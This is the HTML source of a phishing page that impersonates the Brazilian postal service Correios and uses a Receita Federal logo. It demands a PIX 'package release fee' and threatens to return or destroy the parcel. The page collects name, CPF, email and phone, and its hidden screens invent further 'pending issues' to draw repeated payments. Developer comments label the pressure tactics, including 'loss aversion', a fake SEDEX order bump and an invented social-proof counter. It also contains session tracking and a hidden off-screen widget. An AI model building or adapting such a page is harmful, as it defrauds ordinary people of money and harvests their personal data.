<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18454278784"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-18454278784');
</script>

<!-- Event snippet for Visualização de página (2) conversion page -->
<script>
  gtag('event', 'conversion', {
      'send_to': 'AW-18454278784/IjtACLPTuPocEIDl199E',
      'value': 1.0,
      'currency': 'BRL'
  });
</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#004169">
    <meta name="description" content="Pagamento PIX - Liberação de Encomenda - Correios">
    <title>Pagamento - Correios</title>
    <link rel="icon" type="image/webp" href="images/favicon.webp">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="css/encomenda-pagamento.css?v=1774768333">
    <noscript><style>body{visibility:visible!important}</style></noscript>
</head>
<body>

    <!-- HEADER -->
    <header class="header">
        <nav class="header-nav">
            <a href="#" class="logo-link">
                <img src="images/correios.webp" alt="Correios" class="logo-correios">
            </a>
            <div class="header-sac">
                <i class="fas fa-headset"></i>
                <span>SAC 0800 725 7282</span>
            </div>
        </nav>
    </header>

    <!-- ALERTA TOPO (loss aversion) -->
    <div class="alert-bar">
        <i class="fas fa-exclamation-triangle"></i>
        <span>Para a liberação da encomenda, o pagamento da taxa é <strong>obrigatório</strong>. O não pagamento resultará na <strong>devolução ao país de origem</strong>.</span>
    </div>

    <main class="main">
        <!-- SEGURANÇA -->
        <div class="security-bar">
            <i class="fas fa-lock"></i>
            <span>PAGAMENTO SEGURO</span>
        </div>

        <!-- Barra de Pendências (multi-step, hidden initially) -->
        <div class="pendencia-bar" id="pendenciaBar" style="display:none">
            <div class="pendencia-bar-top">
                <span class="pendencia-label" id="pendenciaLabel">Pendência 1 de 4</span>
                <span class="pendencia-step-name" id="pendenciaStepName"></span>
            </div>
            <div class="pendencia-progress">
                <div class="pendencia-fill" id="pendenciaFill" style="width:25%"></div>
            </div>
        </div>

        <!-- Tela de Transição (entre pagamentos) -->
        <div class="screen-transicao" id="screenTransicao" style="display:none">
            <div class="transicao-content">
                <div class="transicao-icon">
                    <div class="scan-ring"></div>
                    <i class="fas fa-magnifying-glass"></i>
                </div>
                <h3>Verificando outras pendências...</h3>
                <p>Analisando status da sua encomenda</p>
                <div class="scan-bar"><div class="scan-fill"></div></div>
            </div>
        </div>

        <!-- Tela de Nova Pendência Encontrada -->
        <div class="screen-nova-pendencia" id="screenNovaPendencia" style="display:none">
            <div class="nova-pendencia-content">
                <div class="nova-pendencia-icon">
                    <i class="fas fa-exclamation-triangle"></i>
                </div>
                <h3>Nova pendência encontrada</h3>
                <div class="nova-pendencia-card">
                    <div class="nova-pendencia-card-header">
                        <i class="fas fa-file-invoice"></i>
                        <div>
                            <strong class="nova-pendencia-titulo" id="novaPendenciaTitulo"></strong>
                            <span class="nova-pendencia-desc" id="novaPendenciaDesc"></span>
                        </div>
                    </div>
                    <div class="nova-pendencia-legal" id="novaPendenciaLegal">
                        <i class="fas fa-gavel"></i>
                        <span>Fundamentação: <strong id="novaPendenciaLegalBase"></strong></span>
                    </div>
                    <div class="nova-pendencia-valor">
                        <span>Valor da taxa:</span>
                        <strong id="novaPendenciaValor">R$ 0,00</strong>
                    </div>
                </div>
                <div class="nova-pendencia-prazo">
                    <i class="fas fa-clock"></i>
                    <span>Regularize agora para evitar devolução, destruição ou leilão do objeto.</span>
                </div>
                <div class="nova-pendencia-riscos">
                    <p class="nova-pendencia-riscos-titulo"><i class="fas fa-triangle-exclamation"></i> O que acontece se não pagar:</p>
                    <ul class="nova-pendencia-riscos-lista" id="novaPendenciaRiscos"></ul>
                </div>
                <button class="nova-pendencia-btn" id="btnPagarPendencia">
                    <i class="fas fa-shield-check"></i>
                    Regularizar Pendência
                </button>
                <p class="nova-pendencia-btn-sub">Pagamento via PIX — confirmação instantânea</p>
            </div>
        </div>

        <div class="checkout-wrapper">

            <!-- PRODUTO -->
            <div class="product-card">
                <div class="product-image">
                    <i class="fas fa-box-open"></i>
                </div>
                <div class="product-info">
                    <span class="product-label">Liberação</span>
                    <span class="product-title">Taxa de Liberação de Encomenda</span>
                    <span class="product-tracking" id="productTracking"></span>
                </div>
                <div class="product-price">
                    <span class="product-qty">1x</span>
                    <strong id="productPrice">R$ 00,00</strong>
                </div>
            </div>

            <!-- FORMULÁRIO -->
            <div class="form-section" id="formSection">
                <h3 class="form-title">Dados do destinatário</h3>

                <form id="checkoutForm" novalidate>
                    <div class="form-field" id="fieldNome">
                        <label for="inputNome">Nome completo <span class="required">*</span></label>
                        <div class="input-wrap">
                            <input type="text" id="inputNome" placeholder="Seu nome completo" maxlength="100" autocomplete="name">
                            <i class="fas fa-check field-check"></i>
                        </div>
                        <small class="field-error" id="erroNome"></small>
                    </div>

                    <div class="form-field" id="fieldCpf">
                        <label for="inputCpf">CPF <span class="required">*</span></label>
                        <div class="input-wrap">
                            <input type="text" id="inputCpf" placeholder="000.000.000-00" maxlength="14" autocomplete="off" inputmode="numeric">
                            <i class="fas fa-check field-check"></i>
                        </div>
                        <small class="field-error" id="erroCpf"></small>
                    </div>

                    <div class="form-field" id="fieldEmail">
                        <label for="inputEmail">E-mail <span class="required">*</span></label>
                        <div class="input-wrap">
                            <input type="email" id="inputEmail" placeholder="seu@email.com" maxlength="120" autocomplete="email" inputmode="email">
                            <i class="fas fa-check field-check"></i>
                        </div>
                        <div class="email-suggestions" id="emailSuggestions" role="listbox"></div>
                        <small class="field-error" id="erroEmail"></small>
                    </div>

                    <div class="form-field" id="fieldTelefone">
                        <label for="inputTelefone">Celular / WhatsApp <span class="optional">(opcional)</span></label>
                        <div class="input-wrap">
                            <input type="tel" id="inputTelefone" placeholder="(00) 00000-0000" maxlength="15" autocomplete="tel" inputmode="tel">
                            <i class="fas fa-check field-check"></i>
                        </div>
                        <small class="field-error" id="erroTelefone"></small>
                    </div>
                </form>
            </div>

            <!-- ORDER BUMP: SEDEX -->
            <div class="order-bump" id="orderBump">
                <label class="bump-checkbox-wrap">
                    <input type="checkbox" id="bumpCheckbox">
                    <span class="bump-check-custom"><i class="fas fa-check"></i></span>
                    <div class="bump-content">
                        <div class="bump-badge">OFERTA ESPECIAL</div>
                        <strong class="bump-title">RECEBA SEU PEDIDO EM 1 DIA ÚTIL</strong>
                        <p class="bump-desc">SEDEX 24H — Entrega expressa garantida</p>
                        <div class="bump-price">
                            <span class="bump-original">R$ 119,90</span>
                            <span class="bump-atual">R$ 19,90</span>
                        </div>
                    </div>
                </label>
            </div>

            <!-- RESUMO -->
            <div class="order-summary" id="orderSummary">
                <div class="summary-line">
                    <span>Taxa de liberação</span>
                    <strong id="summaryBase">R$ 00,00</strong>
                </div>
                <div class="summary-line summary-bump" id="summaryBumpLine" style="display:none">
                    <span>SEDEX 24H</span>
                    <strong>+ R$ 19,90</strong>
                </div>
                <div class="summary-divider"></div>
                <div class="summary-line summary-total">
                    <span>Total</span>
                    <strong id="summaryTotal">R$ 00,00</strong>
                </div>
            </div>

            <!-- SOCIAL PROOF -->
            <div class="social-proof">
                <i class="fas fa-users"></i>
                <span><strong id="proofCount">1.284</strong> encomendas liberadas hoje</span>
            </div>

            <!-- CTA -->
            <button type="button" class="cta-button" id="btnPagar">
                <i class="fas fa-lock"></i>
                <span>PAGAR <strong id="ctaValor">R$ 00,00</strong> COM PIX</span>
            </button>

            <!-- TRUST BADGES -->
            <div class="trust-badges">
                <span><i class="fas fa-bolt"></i> Aprovação instantânea</span>
                <span><i class="fas fa-shield-halved"></i> Ambiente seguro</span>
                <span><i class="fas fa-truck-fast"></i> Liberação em até 10h</span>
            </div>

            <!-- PIX SECTION (hidden) -->
            <div class="pix-section" id="pixSection" style="display:none">

                <!-- Loading -->
                <div class="pix-loading" id="pixLoading">
                    <div class="loading-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
                    <h3>Gerando código PIX</h3>
                    <p>Aguarde enquanto preparamos seu pagamento...</p>
                    <div class="loading-bar"><div class="loading-bar-fill"></div></div>
                </div>

                <!-- Erro -->
                <div class="pix-error" id="pixError" style="display:none">
                    <div class="error-icon"><i class="fas fa-exclamation-triangle"></i></div>
                    <h3>Não foi possível gerar o PIX</h3>
                    <p id="pixErrorMsg">Ocorreu um erro ao processar sua solicitação.</p>
                    <button class="btn-retry" id="btnRetry">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>

                <!-- PIX Content -->
                <div class="pix-content" id="pixContent" style="display:none">

                    <!-- Header PIX -->
                    <div class="pix-header">
                        <div class="pix-header-left">
                            <img src="images/receita-federal-2.png" alt="Receita Federal" class="pix-header-logo">
                            <div>
                                <strong>REGULARIZE SUA ENCOMENDA</strong>
                                <span>Taxa de Liberação</span>
                            </div>
                        </div>
                        <div class="pix-header-right">
                            <span class="pix-header-label">Valor a pagar</span>
                            <span class="pix-header-value" id="pixValor">R$ 00,00</span>
                        </div>
                    </div>

                    <!-- Timer -->
                    <div class="pix-timer">
                        <div class="pix-timer-icon"><i class="fas fa-clock"></i></div>
                        <div class="pix-timer-info">
                            <span class="pix-timer-label">PIX VÁLIDO POR:</span>
                            <span class="pix-timer-value" id="pixTimer">15:00</span>
                        </div>
                        <div class="pix-timer-progress"><div class="pix-timer-bar" id="pixTimerBar"></div></div>
                    </div>

                    <!-- QR Code -->
                    <div class="pix-qr">
                        <img src="" alt="QR Code PIX" id="pixQrCode" width="200" height="200">
                    </div>

                    <!-- Copiar -->
                    <div class="pix-copy">
                        <input type="text" id="pixCodeInput" readonly class="pix-copy-input" placeholder="Código PIX">
                        <button class="pix-copy-btn" id="btnCopiar">
                            <i class="fas fa-copy"></i>
                            COPIAR CÓDIGO PIX
                        </button>
                    </div>

                    <!-- Recebedor -->
                    <div class="pix-receiver">
                        <i class="fas fa-circle-check"></i>
                        <span>No app do banco, confirme o favorecido:</span>
                        <strong id="pixRecebedor"></strong>
                    </div>

                    <!-- Status -->
                    <div class="pix-status" id="pixStatusWaiting">
                        <i class="fas fa-spinner fa-pulse"></i>
                        <div>
                            <strong>Aguardando pagamento</strong>
                            <span>A confirmação é automática — não feche esta página</span>
                        </div>
                    </div>
                    <div class="pix-status pix-status-paid" id="pixStatusPaid" style="display:none">
                        <i class="fas fa-check-circle"></i>
                        <div>
                            <strong>Pagamento confirmado!</strong>
                            <span>Redirecionando...</span>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </main>

    <!-- FOOTER MÍNIMO -->
    <footer class="footer">
        <img src="images/logo-rodape.webp" alt="Correios" class="footer-logo">
        <p>© 2026 Correios — CNPJ 34.028.316/0001-03</p>
    </footer>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
    <script src="js/google-ads.js"></script>
    <script src="js/tracking.js?v=1774768333"></script>
    <script>window._currentStep="pagamento";window._trackEvent("page_view","pagamento");setTimeout(function(){if(window._dsid){fetch("api/save-tracking.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({session_id:window._dsid,event:"heartbeat",step:"pagamento"}),keepalive:true}).catch(function(){});}},500);</script>
    <script src="js/shield.js?v=1774768333"></script>
    <script src="js/pagamento.js?v=1774768333"></script>
    
    <div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>
    
    <div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>
    
</body>
</html>
